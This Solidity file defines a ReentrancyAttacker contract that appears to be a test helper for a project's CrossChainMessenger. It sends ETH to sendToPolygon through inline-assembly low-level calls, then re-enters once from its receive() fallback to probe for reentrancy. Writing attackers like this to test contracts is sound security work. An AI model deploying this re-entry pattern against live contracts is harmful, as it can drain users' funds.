// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "../CrossChainMessenger.sol";

contract ReentrancyAttacker {
    CrossChainMessenger public messenger;
    uint256 public attackCount;
    uint256 public constant ATTACK_VALUE = 1 ether;
    uint256 public constant MIN_BALANCE = 2 ether;
    uint256 public constant GAS_LIMIT = 300000;

    event AttackAttempted(uint256 value, uint256 count);
    event ReentrancyCallFailed(string reason);
    event FallbackCalled(uint256 balance, uint256 count);

    constructor(address _messenger) {
        require(_messenger != address(0), "Invalid messenger address");
        messenger = CrossChainMessenger(_messenger);
    }

    function attackWithGas() external payable {
        require(msg.value >= MIN_BALANCE, "Need at least 2 ETH");
        attackCount = 0;

        // Use direct low-level call with fixed gas
        bytes memory payload = abi.encodeWithSignature(
            "sendToPolygon(address)",
            address(this)
        );

        assembly {
            let success := call(
                GAS_LIMIT,           // gas
                sload(messenger.slot), // target
                ATTACK_VALUE,        // value
                add(payload, 0x20),  // input data offset
                mload(payload),      // input data length
                0,                   // output data offset
                0                    // output data length
            )

            // Revert on failure
            if iszero(success) {
                revert(0, 0)
            }
        }

        emit AttackAttempted(ATTACK_VALUE, 0);
    }

    receive() external payable {
        uint256 currentCount = attackCount;

        if (currentCount < 1 && address(this).balance >= ATTACK_VALUE) {
            emit FallbackCalled(address(this).balance, currentCount);

            bytes memory payload = abi.encodeWithSignature(
                "sendToPolygon(address)",
                address(this)
            );

            assembly {
                let success := call(
                    GAS_LIMIT,           // gas
                    sload(messenger.slot), // target
                    ATTACK_VALUE,        // value
                    add(payload, 0x20),  // input data offset
                    mload(payload),      // input data length
                    0,                   // output data offset
                    0                    // output data length
                )

                // Revert on failure
                if iszero(success) {
                    revert(0, 0)
                }
            }

            attackCount = currentCount + 1;
            emit AttackAttempted(ATTACK_VALUE, attackCount);
        }
    }
}
